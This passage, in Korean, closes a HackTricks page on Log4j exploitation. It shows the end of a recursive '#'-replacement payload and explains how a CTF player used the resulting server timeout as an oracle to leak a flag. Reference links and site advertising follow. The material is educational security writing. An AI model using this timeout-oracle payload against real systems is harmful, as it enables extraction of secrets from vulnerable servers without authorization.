> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> 플래그가 `flagGuess`로 시작하는 경우, 전체 플래그는 29개의 `#`로 대체됩니다 (이 문자를 사용한 이유는 플래그의 일부가 아닐 가능성이 높기 때문입니다). **결과적으로 29개의 `#` 각각이 54개의 `#`로 대체**됩니다. 이 과정은 **6번 반복**되며, 총 ` 29*54*54^6* =`` `` `**`96816014208`  `#`**가 생성됩니다!
>
> 이렇게 많은 `#`을 대체하면 Flask 애플리케이션의 10초 타임아웃이 트리거되어 사용자에게 HTTP 상태 코드 500이 전송됩니다. (`flagGuess`로 시작하지 않는 경우, 500이 아닌 상태 코드를 받게 됩니다)

## 참고 자료

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 더 빠르게 수정하세요. Intruder는 공격 대상을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)!

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
